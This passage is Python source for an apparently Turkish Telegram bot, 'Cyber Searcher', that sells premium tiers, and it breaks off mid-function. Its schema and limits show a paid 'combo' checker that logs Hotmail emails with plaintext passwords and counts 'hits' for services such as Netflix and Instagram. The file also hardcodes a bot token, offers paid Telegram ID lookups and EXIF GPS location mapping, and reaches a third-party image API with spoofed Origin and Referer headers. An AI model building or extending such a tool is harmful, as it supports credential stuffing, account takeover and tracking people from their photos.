# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║         CYBER SEARCHER v4.8 — FULL PRODUCTION           ║
# ║              Developer: @hackledin                       ║
# ║  🔧 AI Image 405 Fix + Parse Mode Fix                   ║
# ╚══════════════════════════════════════════════════════════╝
import telebot
import requests
import os
import threading
import time
import json
import sqlite3
import re
import urllib3
import subprocess
import sys
import uuid
import queue
import base64
import html as html_lib
from pathlib import Path
from datetime import datetime
from random import choice, randint
from string import ascii_lowercase
from urllib.parse import quote
from telebot.types import (
InlineKeyboardMarkup, InlineKeyboardButton,
ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
from yt_dlp import YoutubeDL
import yt_dlp
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional

# ── EXIF / PIL ────────────────────────────────────────────────
try:
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[UYARI] Pillow kurulu değil! Kurmak için: pip install Pillow")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
BOT_TOKEN     = "7885601619:AAFDmzHEl8SymvmrBNXjbhiBH3qHZhCYatQ"
ADMIN_ID      = 8573809926
DB_PATH       = "cyber_searcher.db"
BOT_REGISTRY_FILE = "bot_registry.json"
PREMIUM_PRICE = 400
OSINT_PRICE = 200
FREE_CHECK_LIMIT = 3000
PREMIUM_CHECK_LIMIT = 999999
FREE_CAPTURE_LIMIT = 3
PREMIUM_CAPTURE_LIMIT = 999
FREE_KEYWORD_LIMIT = 3
PREMIUM_KEYWORD_LIMIT = 999
SMS_COUNT = 41

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID SORGU
# ══════════════════════════════════════════════════════════════
TGID_API_BASE          = "https://www.gettg.id/api/search?username="
TGID_FREE_LIMIT        = 5
TGID_PACKAGE_25        = 25
TGID_PACKAGE_50        = 50
TGID_PACKAGE_100       = 100
TGID_PRICE_25          = 89
TGID_PRICE_50          = 180
TGID_PRICE_100         = 250

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE GENERATOR
# ══════════════════════════════════════════════════════════════
AI_IMG_API_URL       = "https://service.minifreeai.com/api/image2image"
AI_IMG_SOURCE_URL    = "https://www.aidoimg.com/ai-image-tools/ai-image-generator/index"
AI_IMG_FREE_LIMIT    = 2
AI_IMG_PACK_25       = 25
AI_IMG_PACK_50       = 50
AI_IMG_PACK_250      = 250
AI_IMG_PRICE_25      = 89
AI_IMG_PRICE_50      = 200
AI_IMG_PRICE_250     = 600

# ══════════════════════════════════════════════════════════════
#  YT-DLP POT
# ══════════════════════════════════════════════════════════════
POT_PROVIDER_URL = "http://127.0.0.1:4416"

def _ytdlp_common_opts():
    return {
        'noplaylist': True, 'quiet': True, 'no_warnings': True,
        'socket_timeout': 30, 'retries': 3, 'fragment_retries': 3,
        'ignoreerrors': False,
        'extractor_args': {'youtubepot-bgutilhttp': {'base_url': [POT_PROVIDER_URL]}},
    }

# ══════════════════════════════════════════════════════════════
#  🛡️ HTML ESCAPE
# ══════════════════════════════════════════════════════════════
def esc(text):
    if text is None:
        return ""
    return html_lib.escape(str(text))

# ══════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════
def db_init():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT DEFAULT '', first_name TEXT DEFAULT '',
        join_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0, total_combos INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0, is_premium_osint INTEGER DEFAULT 0,
        premium_date TEXT DEFAULT '', premium_osint_date TEXT DEFAULT '',
        language TEXT DEFAULT 'tr', api_pref INTEGER DEFAULT 0,
        keywords TEXT DEFAULT 'tiktok,instagram,netflix',
        is_banned INTEGER DEFAULT 0, ban_reason TEXT DEFAULT '', capture_used INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, amount INTEGER, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS daily_usage (
        user_id INTEGER, date TEXT, checks INTEGER DEFAULT 0, hits INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, date))''')
    c.execute('''CREATE TABLE IF NOT EXISTS hotmail_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        email TEXT, password TEXT, status TEXT, detail TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_users (
        user_id INTEGER PRIMARY KEY, free_used INTEGER DEFAULT 0,
        query_balance INTEGER DEFAULT 0, total_queries INTEGER DEFAULT 0,
        tgid_last_query TEXT DEFAULT '')''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        target TEXT, status TEXT, detail TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, queries INTEGER, stars INTEGER, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_users (
        user_id INTEGER PRIMARY KEY, free_used INTEGER DEFAULT 0,
        credit_balance INTEGER DEFAULT 0, total_generated INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        prompt TEXT, status TEXT, result_url TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, credits INTEGER, stars INTEGER, date TEXT)''')
    conn.commit()
    conn.close()

db_init()

def db_get(user_id, col):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else None
    except: return None

def db_set(user_id, col, val):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def add_user(user_id, username="", first_name=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                  (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M")))
        conn.commit(); conn.close()
    except: pass

def is_premium(user_id):
    try: return db_get(user_id, "is_premium") == 1
    except: return False

def is_premium_osint(user_id):
    try: return db_get(user_id, "is_premium_osint") == 1
    except: return False

def is_banned(user_id):
    try: return db_get(user_id, "is_banned") == 1
    except: return False

def get_ban_reason(user_id):
    try:
        r = db_get(user_id, "ban_reason")
        return r or "Belirtilmemiş"
    except: return "Belirtilmemiş"

def set_premium(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium=1, premium_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "HOTMAIL", PREMIUM_PRICE, now))
        conn.commit(); conn.close()
        return True
    except: return False

def set_premium_osint(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium_osint=1, premium_osint_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "OSINT", OSINT_PRICE, now))
        conn.commit(); conn.close()
        return True
    except: return False

def remove_premium(user_id):
    db_set(user_id, "is_premium", 0)
    db_set(user_id, "premium_date", "")

def remove_premium_osint(user_id):
    db_set(user_id, "is_premium_osint", 0)
    db_set(user_id, "premium_osint_date", "")

def get_user_stats(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT total_checks,total_combos,join_date,is_premium,is_premium_osint,premium_date,premium_osint_date,username,first_name,keywords,is_banned,ban_reason,capture_used FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r
    except: return None

def get_user_name(user_id):
    name = db_get(user_id, "first_name")
    if name: return name
    username = db_get(user_id, "username")
    if username: return f"@{username}"
    return str(user_id)

def get_user_keywords(user_id):
    try:
        k = db_get(user_id, "keywords")
        if k: return [x.strip().lower() for x in k.split(',') if x.strip()]
        return ["tiktok", "instagram", "netflix"]
    except: return ["tiktok", "instagram", "netflix"]

def set_user_keywords(user_id, kl):
    db_set(user_id, "keywords", ','.join(kl))

def can_add_keyword(user_id):
    k = get_user_keywords(user_id)
    return len(k) < (PREMIUM_KEYWORD_LIMIT if is_premium(user_id) else FREE_KEYWORD_LIMIT)

def get_keyword_limit_text(user_id):
    return "♾️ Sınırsız" if is_premium(user_id) else f"{FREE_KEYWORD_LIMIT}"

def get_capture_used(user_id):
    try: return db_get(user_id, "capture_used") or 0
    except: return 0

def increment_capture_used(user_id):
    db_set(user_id, "capture_used", get_capture_used(user_id) + 1)

def can_use_capture(user_id):
    return True if is_premium(user_id) else get_capture_used(user_id) < FREE_CAPTURE_LIMIT

def get_capture_limit_text(user_id):
    return "♾️ Sınırsız" if is_premium(user_id) else f"{FREE_CAPTURE_LIMIT - get_capture_used(user_id)}"

def get_daily_usage(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT checks, hits FROM daily_usage WHERE user_id=? AND date=?", (user_id, today))
        r = c.fetchone(); conn.close()
        return {"checks": r[0], "hits": r[1]} if r else {"checks": 0, "hits": 0}
    except: return {"checks": 0, "hits": 0}

def save_hotmail_log(user_id, username, email, password, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO hotmail_logs (user_id, username, email, password, status, detail, date) VALUES (?,?,?,?,?,?,?)",
                  (user_id, username, email, password, status, detail, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def get_hotmail_logs(limit=50):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id, username, email, password, status, detail, date FROM hotmail_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall(); conn.close()
        return r
    except: return []

def get_bot_stats():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT COUNT(*),SUM(is_premium),SUM(is_premium_osint),SUM(total_combos),SUM(total_checks) FROM users WHERE is_banned=0")
        r = c.fetchone(); conn.close()
        return r
    except: return (0, 0, 0, 0, 0)

def get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,is_banned FROM users")
        r = c.fetchall(); conn.close()
        return r
    except: return []

def find_user_by_username(username):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,is_banned FROM users WHERE username=?", (username,))
        r = c.fetchone(); conn.close()
        return r
    except: return None

def get_premium_logs(limit=20):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,package,amount,date FROM premium_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall(); conn.close()
        return r
    except: return []

def update_stats(user_id, combos):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("UPDATE users SET total_checks=total_checks+1, total_combos=total_combos+? WHERE user_id=?", (combos, user_id))
        conn.commit(); conn.close()
    except: pass

def ban_user(user_id, reason="Kural ihlali"):
    db_set(user_id, "is_banned", 1)
    db_set(user_id, "ban_reason", reason)

def unban_user(user_id):
    db_set(user_id, "is_banned", 0)
    db_set(user_id, "ban_reason", "")

def get_banned_users():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,ban_reason FROM users WHERE is_banned=1")
        r = c.fetchall(); conn.close()
        return r
    except: return []

def api_pref(user_id):
    try:
        v = db_get(user_id, "api_pref")
        return v if v is not None else 0
    except: return 0

# ══════════════════════════════════════════════════════════════
#  🆔 TG-ID DB
# ══════════════════════════════════════════════════════════════
def tgid_init_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO tgid_users (user_id) VALUES (?)", (user_id,))
        conn.commit(); conn.close()
    except: pass

def tgid_get(user_id, col):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM tgid_users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else 0
    except: return 0

def tgid_set(user_id, col, val):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE tgid_users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def tgid_get_free_used(user_id): return tgid_get(user_id, "free_used") or 0
def tgid_get_balance(user_id): return tgid_get(user_id, "query_balance") or 0
def tgid_get_total(user_id): return tgid_get(user_id, "total_queries") or 0

def tgid_can_query(user_id):
    if user_id == ADMIN_ID: return True, "admin"
    if is_premium(user_id): return True, "premium"
    if tgid_get_free_used(user_id) < TGID_FREE_LIMIT: return True, "free"
    if tgid_get_balance(user_id) > 0: return True, "balance"
    return False, None

def tgid_use_query(user_id):
    if user_id == ADMIN_ID or is_premium(user_id):
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "unlimited"
    if tgid_get_free_used(user_id) < TGID_FREE_LIMIT:
        tgid_set(user_id, "free_used", tgid_get_free_used(user_id) + 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "free"
    if tgid_get_balance(user_id) > 0:
        tgid_set(user_id, "query_balance", tgid_get_balance(user_id) - 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "balance"
    return False, None

def tgid_add_balance(user_id, amount):
    tgid_set(user_id, "query_balance", tgid_get_balance(user_id) + amount)

def tgid_log_query(user_id, username, target, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO tgid_logs (user_id,username,target,status,detail,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, target, status, detail, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def tgid_log_purchase(user_id, username, package, queries, stars):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO tgid_purchases (user_id,username,package,queries,stars,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, package, queries, stars, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE DB
# ══════════════════════════════════════════════════════════════
def aiimg_init_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO aiimg_users (user_id) VALUES (?)", (user_id,))
        conn.commit(); conn.close()
    except: pass

def aiimg_get(user_id, col):
    try:
        aiimg_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM aiimg_users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else 0
    except: return 0

def aiimg_set(user_id, col, val):
    try:
        aiimg_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE aiimg_users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def aiimg_get_free_used(user_id): return aiimg_get(user_id, "free_used") or 0
def aiimg_get_credits(user_id): return aiimg_get(user_id, "credit_balance") or 0
def aiimg_get_total(user_id): return aiimg_get(user_id, "total_generated") or 0

def aiimg_can_use(user_id):
    if user_id == ADMIN_ID: return True, "admin"
    if is_premium(user_id): return True, "premium"
    if aiimg_get_free_used(user_id) < AI_IMG_FREE_LIMIT: return True, "free"
    if aiimg_get_credits(user_id) > 0: return True, "credits"
    return False, None

def aiimg_use(user_id):
    if user_id == ADMIN_ID or is_premium(user_id):
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "unlimited"
    if aiimg_get_free_used(user_id) < AI_IMG_FREE_LIMIT:
        aiimg_set(user_id, "free_used", aiimg_get_free_used(user_id) + 1)
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "free"
    if aiimg_get_credits(user_id) > 0:
        aiimg_set(user_id, "credit_balance", aiimg_get_credits(user_id) - 1)
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "credits"
    return False, None

def aiimg_add_credits(user_id, amount):
    aiimg_set(user_id, "credit_balance", aiimg_get_credits(user_id) + amount)

def aiimg_log(user_id, username, prompt, status, result_url=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO aiimg_logs (user_id,username,prompt,status,result_url,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, prompt, status, result_url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def aiimg_log_purchase(user_id, username, package, credits, stars):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO aiimg_purchases (user_id,username,package,credits,stars,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, package, credits, stars, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE — API (v4.8 — 405 Fix)
# ══════════════════════════════════════════════════════════════
def aiimg_image_to_base64(image_path):
    if not os.path.exists(image_path):
        raise FileNotFoundError(f"Resim bulunamadı: {image_path}")
    with open(image_path, "rb") as f:
        img_data = f.read()
    ext = os.path.splitext(image_path)[1].lower()
    mime = {
        ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
        ".png": "image/png", ".webp": "image/webp",
        ".bmp": "image/bmp"
    }.get(ext, "image/jpeg")
    b64 = base64.b64encode(img_data).decode("utf-8")
    return f"data:{mime};base64,{b64}"


def aiimg_generate(image_path, prompt, max_tries=40, delay=2.5):
    """
    minifreeai.com image2image — v4.8 (405 Fix)
    Sırayla dener: POST form-data → POST json → GET
    Tam header seti (Origin, Referer, User-Agent)
    """
    try:
        # ═══ 1. Resmi base64'e çevir ═══
        try:
            image_data_uri = aiimg_image_to_base64(image_path)
        except Exception as e:
            return False, f"❌ Resim okunamadı: {esc(e)}"

        payload = {
            "prompt": prompt,
            "function": "ai-image-generator-image2image",
            "image_url_1": image_data_uri
        }

        # ═══ 2. TAM HEADER SETİ ═══
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.aidoimg.com",
            "Referer": "https://www.aidoimg.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }

        print(f"[AI-IMG] Task gönderiliyor... Prompt: {prompt[:50]}")

        # ═══ 3. POST form-data dene ═══
        response = None
        try:
            response = requests.post(
                AI_IMG_API_URL, data=payload, headers=headers,
                timeout=60, verify=False, allow_redirects=True)
            print(f"[AI-IMG] POST form-data → {response.status_code}")
        except Exception as e:
            print(f"[AI-IMG] POST form-data hata: {e}")

        # ═══ 4. POST json dene (405 ise) ═══
        if response is None or response.status_code == 405:
            print(f"[AI-IMG] JSON method deneniyor...")
            try:
                jh = dict(headers); jh["Content-Type"] = "application/json"
                response = requests.post(
                    AI_IMG_API_URL, json=payload, headers=jh,
                    timeout=60, verify=False, allow_redirects=True)
                print(f"[AI-IMG] POST json → {response.status_code}")
            except Exception as e:
                print(f"[AI-IMG] POST json hata: {e}")

        # ═══ 5. GET dene (son çare) ═══
        if response is None or response.status_code == 405:
            print(f"[AI-IMG] GET method deneniyor...")
            try:
                response = requests.get(
                    AI_IMG_API_URL,
                    params={"prompt": prompt, "function": "ai-image-generator-image2image"},
                    headers=headers, timeout=60, verify=False)
                print(f"[AI-IMG] GET → {response.status_code}")
            except Exception as e:
                print(f"[AI-IMG] GET hata: {e}")

        # ═══ Sonuç kontrolü ═══
        if response is None:
            return False, "❌ API'ye ulaşılamadı (tüm method'lar başarısız)."
        if response.status_code != 200:
            return False, f"❌ API Hatası: HTTP {response.status_code}"

        # ═══ Response parse ═══
        try:
            data = response.json()
        except:
            m = re.search(r'"task_id"\s*:\s*"([^"]+)"', response.text)
            if m:
                data = {"task_id": m.group(1)}
            else:
                return False, f"❌ API geçersiz cevap: {esc(response.text[:200])}"

        task_id = data.get("task_id")
        if not task_id:
            return False, f"❌ Task ID alınamadı."

        print(f"[AI-IMG] ✅ Task ID: {task_id}")

        # ═══ Polling ═══
        status_payload = {"task_id": task_id, "source_url": AI_IMG_SOURCE_URL}

        for i in range(max_tries):
            time.sleep(delay)
            try:
                sr = requests.post(AI_IMG_API_URL, data=status_payload,
                                   headers=headers, timeout=30, verify=False)
                if sr.status_code == 405:
                    sr = requests.get(AI_IMG_API_URL, params=status_payload,
                                      headers=headers, timeout=30, verify=False)
                result = sr.json()
            except Exception as e:
                print(f"[AI-IMG] Polling {i+1} hata: {e}")
                continue

            task_status = result.get("task_status") or result.get("status")
            print(f"[AI-IMG] [{i+1}/{max_tries}] {task_status}")

            if task_status in ("SUCCEEDED", "success", "completed"):
                image_url = result.get("url") or result.get("image_url") or result.get("result")
                if image_url:
                    return True, image_url
                return False, "❌ Görsel URL'i alınamadı."
            if task_status in ("FAILED", "failed", "error"):
                return False, f"❌ Üretim başarısız: {esc(str(result)[:200])}"

        return False, "⏰ Zaman aşımı! Sunucu yanıt vermedi."

    except requests.exceptions.Timeout:
        return False, "⏰ API zaman aşımı!"
    except requests.exceptions.ConnectionError:
        return False, "🌐 Bağlantı hatası!"
    except Exception as e:
        return False, f"❌ Beklenmeyen hata: {esc(e)}"

# ══════════════════════════════════════════════════════════════
#  📸 EXIF
# ══════════════════════════════════════════════════════════════
def _exif_koordinat_cevir(deger, ref):
    try:
        d = float(deger[0]); m = float(deger[1]); s = float(deger[2])
        ondalik = d + (m / 60.0) + (s / 3600.0)
        if str(ref).upper() in ('S', 'W'): ondalik = -ondalik
        return round(ondalik, 7)
    except: return None

def _exif_analiz(dosya_yolu):
    if not PIL_AVAILABLE:
        return None, "❌ Pillow kurulu değil."
    try:
        img = Image.open(dosya_yolu)
        exif_ham = img._getexif()
    except Exception as e:
        return None, f"❌ Dosya okunamadı: {esc(e)}"
    if not exif_ham:
        return None, "⚠️ Bu fotoğrafta EXIF verisi yok."
    exif = {}; gps = {}
    for tag_id, val in exif_ham.items():
        tag = TAGS.get(tag_id, tag_id)
        if tag == "GPSInfo":
            if isinstance(val, dict):
                for gid, gv in val.items(): gps[GPSTAGS.get(gid, gid)] = gv
        else: exif[tag] = val
    marka = str(exif.get("Make", "Bilinmiyor")).strip()
    model = str(exif.get("Model", "Bilinmiyor")).strip()
    yazilim = str(exif.get("Software", "—")).strip()
    tarih = (exif.get("DateTimeOriginal") or exif.get("DateTime") or "Bilinmiyor")
    gen = (exif.get("ExifImageWidth") or exif.get("ImageWidth") or img.width)
    yuk = (exif.get("ExifImageHeight") or exif.get("ImageLength") or img.height)
    iso = exif.get("ISOSpeedRatings", "—")
    if isinstance(iso, (list, tuple)): iso = iso[0] if iso else "—"
    try: diyafram = f"f/{float(exif.get('FNumber')):.1f}"
    except: diyafram = "—"
    try:
        ov = float(exif.get("ExposureTime"))
        obturator = f"1/{int(round(1/ov))}s" if 0 < ov < 1 else f"{ov}s"
    except: obturator = "—"
    try: odak = f"{float(exif.get('FocalLength')):.0f} mm"
    except: odak = "—"
    flas = exif.get("Flash")
    if flas is not None:
        try: flas = "✅ Ateşlendi" if int(flas) & 1 else "❌ Ateşlenmedi"
        except: flas = "—"
    else: flas = "—"
    lens = exif.get("LensModel") or exif.get("LensMake") or "—"
    omap = {1:"Normal",2:"Ayna (Yatay)",3:"180° Döndürülmüş",4:"Ayna (Dikey)",
            5:"Ayna + 90° CW",6:"90° CW",7:"Ayna + 90° CCW",8:"90° CCW"}
    orientation = omap.get(exif.get("Orientation"), "—")
    enlem = boylam = harita = None; gps_tarih = None; gps_altitude = None
    if gps:
        enl_v = gps.get("GPSLatitude"); boy_v = gps.get("GPSLongitude")
        if enl_v and boy_v:
            enlem = _exif_koordinat_cevir(enl_v, gps.get("GPSLatitudeRef"))
            boylam = _exif_koordinat_cevir(boy_v, gps.get("GPSLongitudeRef"))
            if enlem is not None and boylam is not None:
                harita = f"https://www.google.com/maps?q={enlem},{boylam}"
        gd = gps.get("GPSDateStamp"); gt = gps.get("GPSTimeStamp")
        if gd and gt:
            try:
                h, m, s_ = [int(float(x)) for x in gt]
                gps_tarih = f"{gd} {h:02d}:{m:02d}:{s_:02d} UTC"
            except: gps_tarih = str(gd)
        alt = gps.get("GPSAltitude"); aref = gps.get("GPSAltitudeRef", 0)
        if alt is not None:
            try:
                av = float(alt)
                if int(aref) == 1: av = -av
                gps_altitude = f"{av:.1f} m"
            except: pass
    return {
        "marka":marka,"model":model,"yazilim":yazilim,"tarih":tarih,
        "genislik":gen,"yukseklik":yuk,"iso":iso,"diyafram":diyafram,
        "obturator":obturator,"odak":odak,"flas":flas,"lens":lens,
        "orientation":orientation,"enlem":enlem,"boylam":boylam,
        "harita":harita,"gps_var":bool(gps),"gps_tarih":gps_tarih,
        "gps_altitude":gps_altitude,"toplam_etiket":len(exif),
    }, None

def _exif_mesaj_olustur(d):
    cihaz = f"{d['marka']} {d['model']}".strip()
    if cihaz.lower() in ("bilinmiyor bilinmiyor", "bilinmiyor", ""): cihaz = "Bilinmiyor"
    msg = (f"📸 <b>EXIF METADATA ANALİZİ</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"📱 <b>Cihaz:</b> <code>{esc(cihaz)}</code>\n"
           f"🔧 <b>Yazılım:</b> <code>{esc(d['yazilim'])}</code>\n"
           f"📅 <b>Çekim Tarihi:</b> <code>{esc(d['tarih'])}</code>\n")
    if d.get("lens") and d["lens"] != "—":
        msg += f"🔭 <b>Lens:</b> <code>{esc(d['lens'])}</code>\n"
    msg += (f"\n<b>📐 Teknik Detaylar</b>\n"
            f"────────────────────\n"
            f"🖼 <b>Boyut:</b> <code>{esc(d['genislik'])} × {esc(d['yukseklik'])} px</code>\n"
            f"🎯 <b>ISO:</b> <code>{esc(d['iso'])}</code>\n"
            f"📷 <b>Diyafram:</b> <code>{esc(d['diyafram'])}</code>\n"
            f"⏱ <b>Obtüratör:</b> <code>{esc(d['obturator'])}</code>\n"
            f"🔭 <b>Odak Uzaklığı:</b> <code>{esc(d['odak'])}</code>\n"
            f"⚡ <b>Flaş:</b> {d['flas']}\n"
            f"🔄 <b>Yönlendirme:</b> <code>{esc(d['orientation'])}</code>\n"
            f"🏷 <b>Toplam Etiket:</b> <code>{esc(d.get('toplam_etiket', 0))}</code>\n")
    if d["harita"]:
        msg += (f"\n<b>📍 GPS KOORDİNATLARI</b>\n"
                f"────────────────────\n"
                f"🌐 <b>Enlem:</b> <code>{esc(d['enlem'])}</code>\n"
                f"🌐 <b>Boylam:</b> <code>{esc(d['boylam'])}</code>\n")
        if d.get("gps_altitude"): msg += f"⛰ <b>Rakım:</b> <code>{esc(d['gps_altitude'])}</code>\n"
        if d.get("gps_tarih"): msg += f"🕐 <b>GPS Zamanı:</b> <code>{esc(d['gps_tarih'])}</code>\n"
        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps</a>\n"
    else:
        msg += f"📍 <b>GPS:</b> <code>Konum verisi yok</code>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🤖 <i>Cyber Searcher v4.8 | @hackledin</i>"
    return msg

# ══════════════════════════════════════════════════════════════
#  🎵 MÜZİK
# ══════════════════════════════════════════════════════════════
MUSIC_LOCK = threading.Lock()

def _youtube_ara(sorgu):
    try:
        q = quote(sorgu)
        html = requests.get(
            f"https://www.youtube.com/results?search_query={q}",
            headers={"User-Agent": "Mozilla/5.0"}, timeout=15, verify=False).text
        matches = re.findall(r'/watch\?v=([a-zA-Z0-9_-]{11})', html)
        if matches: return f"https://www.youtube.com/watch?v={matches[0]}"
        return None
    except: return None

def _muzik_indir(sorgu):
    if "youtube.com" in sorgu or "youtu.be" in sorgu: url = sorgu
    else: url = _youtube_ara(sorgu)
    if not url: return {"ok": False, "error": "❌ Şarkı bulunamadı."}
    os.makedirs("muzikler", exist_ok=True)
    try:
        subprocess.run(["ffmpeg","-version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        ffmpeg_available = True
